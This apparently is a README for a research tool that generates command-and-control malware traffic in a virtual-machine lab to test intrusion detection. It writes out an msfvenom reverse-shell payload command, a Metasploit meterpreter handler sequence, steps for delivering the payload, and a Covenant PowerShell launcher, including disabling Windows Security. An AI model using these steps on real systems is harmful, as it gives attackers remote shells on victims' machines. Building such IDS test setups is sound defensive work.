# C2abstraction
C2 abstraction layer that provides high-level diverse malware attacks to test IDS. 

Important Notes: Updated 11-07-2023

The important python files are 'C2Abstraction' and 'Mouse Script'

# Virtual Machines:

Attacker - Kali Linux (each IP is different => Must change line 64 in setup)

Victim - Another virtual machine (in this case using Windows)

    Preliminary work:
        - Setting up Kali Linux (on VMWare, an alternative is on Oracle VM): https://www.youtube.com/watch?v=pwYH0NNWWzU
        - Setting up victim machine: https://www.youtube.com/watch?v=nvdnQX9UkMY&t=259s

# METASPLOIT:
    How to create a payload?
        - If you are creating a payload for testing directly from terminal
          run command 'msfvenom -p windows/shell/reverse_tcp LHOST=192.168.110.129 LPORT=4444 -f exe > ~/Desktop/ShellCodes/payload.exe'
          NOTE: this command assumes that you have a folder called 'ShellCodes' (can be removed)

    How to deploy the payload? (Need to automate this step)
        - As of right now, you can create a server to host the payload by
          right clicking on the folder and choose 'open terminal here' then
          use the command 'python3 -m http.server'

        - How to access this sever on the victim machine?
            * Open a webserver and type in 'http://{ip of kali machine}:{port number}'
            * In this case it is 'http://192.168.239.128:8000 (8000 is the default port)

    How to run msfvenom?
        - run 'msfconsole' in command line
        - then type in 'use exploit/multi/handler'
        - then set payload as 'set payload windows/meterpreter/reverse_tcp'
        - set host using 'set lhost {attacker ip}'
        - set listening port using 'set lport {target_port}'
        - then type in 'exploit'
        NOTE: in the code this whole sequence is chained into one line on line 46: 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set lhost {target_ip}; set lport {target_port}; exploit;


    How to track if HTTP commands/connections are going through?
        -You can catch the logs of the HTTP connections in real time by
            * going to /etc
            * then go to /ssh
            * then use 'nano' command to edit the 'sshd_config' file
            * look for the line '#LogLevel INFO'
            * remove the # then replace INFO with 'VERBOSE'
            * now run 'sudo journalctl -f' in the command line to track the logs
    
    How to run the payload on the victim machine?
        - Using SCP we can connect to the victim machine via SSH and execute the payload 


# COVENANT:

NOTE: What is the difference between covenant and metasploit?

- Covenant has a web GUI that requires a script to control the mouse to deploy the malware

How to download covenant/introduction to covenant: https://www.youtube.com/watch?v=BLMW0fougFM

How to use the interface: https://www.youtube.com/watch?v=iX_qsbbNk2w

    IMPORTANT: You must have convenant running in GIT bash at all times 

    How to create a listener? 
        - On the web GUI, click on the 'Listener' tab. Then name your listener and set the port.
        - Make sure that the IP address is correct. You can check your IP address by running the command 'ipconfig' in your terminal and use the IPv4 address.
          To check that the listener is active, run 'netstat -ant' in your terminal and look for the port number that you specified. 

    How to create the grunt to connect to the listener?
        - On the web GUI, click on the 'Launcher' tab. Since our victim machine is windows, click on 'PowerShell' and generate the launcher
        - Then copy and paste into the powershell of your vicitm machine. MAKE SURE TO TURN OFF YOUR WINDOWS SECURITY. 
        - Once activated, you will get a notification on the GUI. In the 'Grunt' tab, you will see the host name. Then you can click on the active grunt and go to the 'interactive' tab to begin executing commands.
        

Mouse Script:
    - This python file is used to provide examples of how commands for automatically controlling your mouse to navigate a webpage work.
    - This is important for navigating the GUI of Covenant




# Citation
    @Unpublished{HungVu_IDS_TESTING_C2,
      author = {Hung Anh Vu},
      title = {{Research Testing Environment}},
      url = {https://github.com/HungAnhVu/C2abstraction},
      version = {1.0.0},
      year = {2023}
    }
